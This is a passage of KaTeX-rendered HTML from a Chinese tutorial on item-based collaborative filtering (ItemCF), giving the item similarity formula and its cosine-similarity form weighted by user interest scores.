mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，定义交集 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">V</mi><mo>=</mo><mi mathvariant="script">W</mi><mi mathvariant="normal">_</mi><mn>1</mn><mo>∩</mo><mi mathvariant="script">W</mi><mi mathvariant="normal">_</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">\mathcal{V}=\mathcal{W}\_{1} \cap \mathcal{W}\_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">V</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">W</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">1</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">W</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">2</span></span></span></span></span>，则两个物品的相似度：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">sim</mi><mo>⁡</mo><mrow><mo fence="true">(</mo><msub><mi>i</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>i</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow><mo>=</mo><mfrac><mrow><mi mathvariant="normal">∣</mi><mi mathvariant="script">V</mi><mi mathvariant="normal">∣</mi></mrow><msqrt><mrow><mrow><mo fence="true">∣</mo><mi mathvariant="script">W</mi><mi mathvariant="normal">_</mi><mn>1</mn><mo fence="true">∣</mo></mrow><mo>⋅</mo><mrow><mo fence="true">∣</mo><mi mathvariant="script">W</mi><mi mathvariant="normal">_</mi><mn>2</mn><mo fence="true">∣</mo></mrow></mrow></msqrt></mfrac></mrow><annotation encoding="application/x-tex">\operatorname{sim}\left(i_{1}, i_{2}\right)=\frac{|\mathcal{V}|}{\sqrt{\left|\mathcal{W}\_{1}\right| \cdot\left|\mathcal{W}\_{2}\right|}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span class="mord mathrm">s</span><span class="mord mathrm">i</span><span class="mord mathrm">m</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.157em;vertical-align:-1.7300000000000002em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.11em;"><span class="pstrut" style="height:3.243985em;"></span><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.243985em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8679800000000001em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">W</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">1</span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8679800000000001em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8679800000000001em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">W</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">2</span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8679800000000001em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.2039849999999994em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.8800000000000001em;"><svg width='400em' height='1.8800000000000001em' viewBox='0 0 400000 1944' preserveAspectRatio='xMinYMin slice'><path d='M983 90l0 -0c4,-6.7,10,-10,18,-10 H400000v40H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5c53.7,-170.3,84.5,-266.8,92.5,-289.5zM1001 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5960150000000002em;"><span></span></span></span></span></span></span></span><span style="top:-3.473985em;"><span class="pstrut" style="height:3.243985em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.920985em;"><span class="pstrut" style="height:3.243985em;"></span><span class="mord"><span class="mord">∣</span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">V</span></span><span class="mord">∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.7300000000000002em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><blockquote><p>注： 公式没有考虑喜欢的程度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>i</mi><mi>k</mi><mi>e</mi><mo stretchy="false">(</mo><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mo separator="true">,</mo><mi>i</mi><mi>t</mi><mi>e</mi><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">like(user, item)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">m</span><span class="mclose">)</span></span></span></span>，喜欢就记为1，不喜欢就记为0</p></blockquote><p>考虑用户喜欢物品的程度：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">sim</mi><mo>⁡</mo><mrow><mo fence="true">(</mo><msub><mi>i</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>i</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow><mo>=</mo><mfrac><mrow><munder><mo>∑</mo><mrow><mi>v</mi><mo>∈</mo><mi mathvariant="script">V</mi></mrow></munder><mi mathvariant="normal">like</mi><mo>⁡</mo><mrow><mo fence="true">(</mo><mi>v</mi><mo separator="true">,</mo><msub><mi>i</mi><mn>1</mn></msub><mo fence="true">)</mo></mrow><mo>⋅</mo><mi mathvariant="normal">like</mi><mo>⁡</mo><mrow><mo fence="true">(</mo><mi>v</mi><mo separator="true">,</mo><msub><mi>i</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow></mrow><mrow><msqrt><mrow><munder><mo>∑</mo><mrow><msub><mi>u</mi><mn>1</mn></msub><mo>∈</mo><mi mathvariant="script">W</mi><mi mathvariant="normal">_</mi><mn>1</mn></mrow></munder><msup><mo><mi mathvariant="normal">like</mi><mo>⁡</mo></mo><mn>2</mn></msup><mrow><mo fence="true">(</mo><msub><mi>u</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>i</mi><mn>1</mn></msub><mo fence="true">)</mo></mrow></mrow></msqrt><mo>⋅</mo><msqrt><mrow><munder><mo>∑</mo><mrow><msub><mi>u</mi><mn>2</mn></msub><mo>∈</mo><mi mathvariant="script">W</mi><mi mathvariant="normal">_</mi><mn>2</mn></mrow></munder><msup><mo><mi mathvariant="normal">like</mi><mo>⁡</mo></mo><mn>2</mn></msup><mrow><mo fence="true">(</mo><msub><mi>u</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>i</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow></mrow></msqrt></mrow></mfrac></mrow><annotation encoding="application/x-tex">\operatorname{sim}\left(i_{1}, i_{2}\right)=\frac{\sum_{v \in \mathcal{V}} \operatorname{like}\left(v, i_{1}\right) \cdot \operatorname{like}\left(v, i_{2}\right)}{\sqrt{\sum_{u_{1} \in \mathcal{W}\_{1}} \operatorname{like}^{2}\left(u_{1}, i_{1}\right)} \cdot \sqrt{\sum_{u_{2} \in \mathcal{W}\_{2}} \operatorname{like}^{2}\left(u_{2}, i_{2}\right)}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span class="mord mathrm">s</span><span class="mord mathrm">i</span><span class="mord mathrm">m</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.1970800000000006em;vertical-align:-1.7300000000000002em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4670800000000002em;"><span style="top:-2.11em;"><span class="pstrut" style="height:3.175869em;"></span><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.175869em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.17862099999999992em;"><span style="top:-2.4002900000000005em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mrel mtight">∈</span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.08222em;">W</span></span><span class="mord mtight" style="margin-right:0.02778em;">_</span><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.51671em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop"><span class="mord mathrm">l</span><span class="mord mathrm">i</span><span class="mord mathrm">k</span><span class="mord mathrm">e</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8984479999999999em;"><span style="top:-3.1473400000000002em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-3.1358689999999996em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.8800000000000001em;"><svg width='400em' height='1.8800000000000001em' viewBox='0 0 400000 1944' preserveAspectRatio='xMinYMin slice'><path d='M983 90l0 -0c4,-6.7,10,-10,18,-10 H400000v40H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5c53.7,-170.3,84.5,-266.8,92.5,-289.5zM1001 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.664131em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.175869em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.17862099999999992em;"><span style="top:-2.4002900000000005em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mrel mtight">∈</span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.08222em;">W</span></span><span class="mord mtight" style="margin-right:0.02778em;">_</span><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.51671em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop"><span class="mord mathrm">l</span><span class="mord mathrm">i</span><span class="mord mathrm">k</span><span class="mord mathrm">e</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8984479999999999em;"><span style="top:-3.1473400000000002em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-3.1358689999999996em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.8800000000000001em;"><svg width='400em' height='1.8800000000000001em' viewBox='0 0 400000 1944' preserveAspectRatio='xMinYMin slice'><path d='M983 90l0 -0c4,-6.7,10,-10,18,-10 H400000v40H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5c53.7,-170.3,84.5,-266.8,92.5,-289.5zM1001 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.664131em;"><span></span></span></span></span></span></span></span><span style="top:-3.405869em;"><span class="pstrut" style="height:3.175869em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.892949em;"><span class="pstrut" style="height:3.175869em;"></span><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.17862099999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">v</span><span class="mrel mtight">∈</span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.08222em;">V</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.32708000000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mord mathrm">l</span><span class="mord mathrm">i</span><span class="mord mathrm">k</span><span class="mord mathrm">e</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mop"><span class="mord mathrm">l</span><span class="mord mathrm">i</span><span class="mord mathrm">k</span><span class="mord mathrm">e</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.7300000000000002em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>上述公式就是余弦相似度，把每个物品表示为一个向量，向量的每个元素表示每个用户的兴趣分数。</p><h2 id="1-4-小结">1.4 小结</h2><p><strong>ItemCF 的基本思想</strong>是根据物品之间的相似度做推荐。即如果用户喜欢物品 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>t</mi><mi>e</mi><msub><mi>m</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">item_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.15em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，⽽且物品 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>t</mi><mi>e</mi><msub><mi>m</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">item_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.15em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>t</mi><mi>e</mi><msub><mi>m</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">item_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.15em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span 